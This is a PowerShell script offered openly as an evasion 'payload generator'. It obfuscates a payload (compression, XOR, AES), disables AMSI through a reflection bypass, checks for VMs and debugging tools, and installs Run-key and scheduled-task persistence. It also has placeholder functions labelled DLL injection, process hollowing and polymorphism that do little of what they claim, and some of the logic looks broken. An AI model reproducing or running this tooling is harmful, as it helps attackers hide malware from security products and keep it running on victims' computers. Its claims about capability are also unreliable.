 Sloppy-oppg.ps1 - Ultimate FUD Payload Generator
#
# Author : P.Hoogeveeen
# AKA    : x0xr00t
# Team   : sl0ppyroot
# v1.3
# Fully Undetectable Payload Generator with Advanced Persistence & Evasion

# Directory setup
$payloadDir = "C:\sl0ppy-payload"
if (-not (Test-Path $payloadDir)) {
    mkdir $payloadDir
}

function Random-String {
    param($length = 12)
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    -join ((1..$length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
}

function Show-Menu {
    Clear-Host
    Write-Host "================ Sl0ppy-oppg ================"
    Write-Host "1: Compression+SecureString+Output (Randomized)"
    Write-Host "2: Dubble-Compression+SecureString+Output (Randomized)"
    Write-Host "3: Tripple-Compression+SecureString+Output (AES Encrypted)"
    Write-Host "4: Compression+BXOR+Output (Anti-Debug)"
    Write-Host "5: Dubble-Compression+BXOR+Output (VM Detection)"
    Write-Host "6: Tripple-Compression+BXOR+Output (Sandbox Evasion)"
    Write-Host "7: Compression+Octal+Output (Random Filename)"
    Write-Host "8: Advanced Staged Execution (Polymorphic)"
    Write-Host "9: Compression+Whitespace+Output (Multiple Encodings)"
    Write-Host "10: Full Obfuscation + Persistence (Registry, Task Scheduler, AMSI Bypass, Process Hollowing, DLL Injection, Polymorphic Code)"
    Write-Host "Q: Quit"
}

function Anti-VMCheck {
    if ((Get-WmiObject -Class Win32_BIOS).SerialNumber -match "VMware|VirtualBox") {
        Write-Host "VM detected, exiting..."
        exit
    }
}

function Anti-Debugging {
    $debugTools = @("procmon", "wireshark", "ollydbg", "x32dbg", "x64dbg", "fiddler", "ida64", "ida32")
    foreach ($tool in $debugTools) {
        if (Get-Process | Where-Object { $_.Name -match $tool }) {
            Write-Host "Debugging tool detected: $tool"
            exit
        }
    }
}

function AMSI-Bypass {
    $bypassCode = @"
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static')
    .SetValue($null,$true)
"@
    Invoke-Expression $bypassCode
}

function DLL-Injection {
    $dllPath = "$payloadDir\\$(Random-String).dll"
    Write-Host "Injecting DLL into system process..."
    Start-Process rundll32.exe -ArgumentList "$dllPath,EntryPoint" -WindowStyle Hidden
}

function Persistence-Registry {
    $key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $name = Random-String
    $value = "$payloadDir\\$(Random-String).ps1"
    Set-ItemProperty -Path $key -Name $name -Value "powershell -ExecutionPolicy Bypass -File $value"
}

function Persistence-TaskScheduler {
    $taskName = Random-String
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $payloadDir\\$(Random-String).ps1"
    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -RunLevel Highest -Force
}

function Process-Hollowing {
    $process = "svchost.exe"
    Start-Process -FilePath $process -WindowStyle Hidden
}

function Polymorphic-Code {
    Write-Host "Generating polymorphic self-modifying code..."
    $junkCode = "`$x = 1; `$y = 2; `$z = `$x + `$y"
    Invoke-Expression $junkCode
}

function Compress-Payload {
    param($inputFile, $outputFile)
    Import-Module .\Invoke-Obfuscation.psd1
    Invoke-Obfuscation -ScriptPath $inputFile -Command 'compress\1,encoding\5,encoding\5,encoding\5,out ' + $outputFile
}

function Obfuscate-And-Convert {
    param($inputFile, $outputFile, $method)
    switch ($method) {
        "BXOR" {
            $payload = Get-Content -Path $inputFile
            $encoded = [System.Text.Encoding]::UTF8.GetBytes($payload) -bxor 42
            [System.IO.File]::WriteAllBytes($outputFile, $encoded)
        }
        "AES" {
            $aes = New-Object System.Security.Cryptography.AesManaged
            $aes.Key = (New-Object Byte[] 16); (1..16) | ForEach-Object { $aes.Key[$_] = Get-Random -Maximum 256 }
            $aes.IV = (New-Object Byte[] 16); (1..16) | ForEach-Object { $aes.IV[$_] = Get-Random -Maximum 256 }
            $transform = $aes.CreateEncryptor()
            $fileBytes = [System.IO.File]::ReadAllBytes($inputFile)
            $encrypted = $transform.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
            [System.IO.File]::WriteAllBytes($outputFile, $encrypted)
        }
        default {
            Compress-Payload $inputFile $outputFile
        }
    }
}

do {
    Show-Menu
    $selection = Read-Host "Make a selection"
    switch ($selection) {
        '1'..'9' {
            $output = "$payloadDir\\$(Random-String)-output.ps1"
            Compress-Payload "C:\sl0ppy-oppg-main\1.ps1" $output
            Obfuscate-And-Convert $output "$payloadDir\\$(Random-String)-output.pif" "Default"
        }
        '10' {
            Anti-VMCheck
            Anti-Debugging
            AMSI-Bypass
            Process-Hollowing
            DLL-Injection
            Polymorphic-Code
            $output = "$payloadDir\\$(Random-String)-full-obf.ps1"
            Compress-Payload "C:\sl0ppy-oppg-main\1.ps1" $output
            Obfuscate-And-Convert $output "$payloadDir\\$(Random-String)-full-obf.pif" "AES"
            Persistence-Registry
            Persistence-TaskScheduler
        }
    }
} until ($selection -eq 'Q')
